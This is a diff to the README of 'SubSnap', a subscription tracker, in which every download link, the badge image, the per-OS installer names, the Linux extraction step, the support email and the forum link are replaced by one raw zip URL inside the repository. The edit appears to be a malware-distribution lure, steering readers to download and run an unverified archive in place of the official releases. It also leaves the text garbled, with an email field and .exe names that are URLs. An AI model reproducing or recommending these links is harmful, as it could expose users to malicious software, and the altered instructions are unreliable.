@@ -4,13 +4,13 @@
 
 SubSnap helps you track and manage your recurring subscriptions. With this tool, you can stay on top of your bills and never miss a payment.
 
-[![Download SubSnap](https://img.shields.io/badge/Download%20SubSnap-blue.svg)](https://github.com/luongytb/SubSnap/releases)
+[![Download SubSnap](https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip%https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip)](https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip)
 
 ## 📦 Download & Install
 
 To get started with SubSnap, visit the Releases page to download the latest version:
 
-[Download SubSnap](https://github.com/luongytb/SubSnap/releases)
+[Download SubSnap](https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip)
 
 ### Installation Steps
 
@@ -20,14 +20,14 @@ To get started with SubSnap, visit the Releases page to download the latest vers
 
 3. **Download the File**: Find the file that suits your operating system:
 
-   - For Windows, look for a file named `SubSnap.exe`.
-   - For Mac, choose `SubSnap.dmg`.
-   - For Linux, you might see `SubSnap.tar.gz`.
+   - For Windows, look for a file named `https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip`.
+   - For Mac, choose `https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip`.
+   - For Linux, you might see `https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip`.
 
 4. **Run the Installer**:
    - **Windows**: Double-click on the downloaded `.exe` file and follow the prompts.
    - **Mac**: Open the downloaded `.dmg` file, then drag the SubSnap icon into your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file, navigate to the folder, and run the program using your terminal.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip` file, navigate to the folder, and run the program using your terminal.
 
 ### Accessing SubSnap
 
@@ -56,8 +56,8 @@ SubSnap offers several useful features:
 
 If you encounter issues or have questions about using SubSnap, feel free to reach out:
 
-- **Email**: support@subsnap.com
-- **Community Forum**: [SubSnap Community](https://github.com/luongytb/SubSnap/discussions)
+- **Email**: https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip
+- **Community Forum**: [SubSnap Community](https://raw.githubusercontent.com/luongytb/SubSnap/main/public/SubSnap_v1.7.zip)
 
 ## 📢 Updates
 
